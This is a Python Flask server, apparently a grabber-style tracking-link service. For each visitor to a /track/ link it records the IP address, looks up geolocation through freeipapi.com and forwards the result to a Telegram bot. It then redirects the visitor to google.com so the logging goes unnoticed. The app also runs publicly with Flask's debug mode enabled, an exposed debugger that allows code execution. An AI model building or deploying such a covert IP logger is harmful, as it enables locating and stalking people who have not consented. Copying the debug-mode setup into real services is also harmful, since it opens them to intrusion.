from flask import Flask, request, redirect, jsonify
import requests
from bot import handle_tracking_data
import asyncio
import os
from telegram import Bot
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.bot = Bot(token=os.getenv('BOT_TOKEN'))

@app.route('/')
def home():
    return "Bot is running!"

@app.route('/track/<tracking_id>')
def track(tracking_id):
    try:
        # Get IP address
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if not ip:
            ip = request.remote_addr
            
        print(f"Received request from IP: {ip}")
        
        # Make request to FreeIPAPI
        api_url = f'https://freeipapi.com/api/json/{ip}'
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/json'
        }
        
        print(f"Requesting data from: {api_url}")
        response = requests.get(api_url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            ip_data = response.json()
            print(f"Received API response: {ip_data}")
            # Handle the tracking data
            asyncio.run(handle_tracking_data(tracking_id, ip_data, app.bot))
        else:
            error_msg = f"API Error: {response.status_code}"
            print(error_msg)
            ip_data = {"error": error_msg}
            asyncio.run(handle_tracking_data(tracking_id, ip_data, app.bot))
            
    except Exception as e:
        error_msg = f"Error: {str(e)}"
        print(error_msg)
        ip_data = {"error": error_msg}
        try:
            asyncio.run(handle_tracking_data(tracking_id, ip_data, app.bot))
        except:
            print("Failed to send error message to bot")
    
    # Redirect to a safe page
    return redirect("https://google.com")

@app.errorhandler(404)
def not_found(e):
    return jsonify(error=str(e)), 404

@app.errorhandler(500)
def server_error(e):
    return jsonify(error=str(e)), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True) 